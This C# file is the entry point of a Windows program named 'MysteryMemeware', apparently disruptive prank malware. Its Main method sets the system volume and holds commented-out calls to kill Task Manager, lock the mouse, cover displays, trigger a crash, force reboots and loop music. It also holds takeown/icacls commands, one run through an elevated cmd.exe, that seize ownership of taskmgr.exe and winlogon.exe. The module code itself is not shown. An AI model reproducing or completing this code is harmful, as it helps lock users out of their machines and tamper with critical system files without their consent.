using System;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace MysteryMemeware
{
    //takeown /f "C:\Windows\System32\taskmgr.exe" && icacls "C:\Windows\System32\taskmgr.exe" /grant administrators:F
    //takeown /f "C:\Windows\System32\winlogon.exe" && icacls "C:\Windows\System32\winlogon.exe" /grant administrators:F
    public static class Program
    {
        const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
        const uint MOUSEEVENTF_LEFTUP = 0x0004;
        [STAThread]
        public static void Main()
        {
            //FailSafeModule.RunKillLoop();

            //WinLogOffModule.Reboot();

            VolumeModule.SetVolume();
            //TaskMGRModule.KillTaskMGR();

           // MouseLockModule.LockMouse();
           // MusicModule.PlayMusic();
            //DisplayCoverModule.CoverDisplays();

            /*while (true)
            {
                System.Threading.Thread.Sleep(1000);
            }*/




            //FileServerModule.Main();

            /* System.Threading.Thread.Sleep(1000);

             VolumeModule.SetVolume(10);
            VideoPlayerModule.RunForms(port);
             MusicModule.PlayRickRollLooping();

             /*Thread mouseLockThread = new Thread(() =>
             {
                 LockCursor();
             });
             //mouseLockThread.Start();*/

            //InputModule.RunKillLoop();

            //WinLogOffModule.Reboot(true);
            //BlueCrashModule.ExecuteBlueCrash();
            /* ProcessStartInfo processStartInfo = new ProcessStartInfo(@"C:\Windows\System32\cmd.exe");
             processStartInfo.Verb = "runas";
             processStartInfo.Arguments = @"/c takeown /f ""C:\Windows\System32\taskmgr.exe"" && icacls ""C:\Windows\System32\taskmgr.exe"" /grant administrators:F";
             Process cmdProcess = Process.Start(processStartInfo);
             Console.ReadLine();*/
            //SlowCursor();


            // DisableDisplays();

            //PlayRickRoll();
        }
        [DllImport("user32.dll")]
        static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
        public static bool IsAdmin()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
    }
}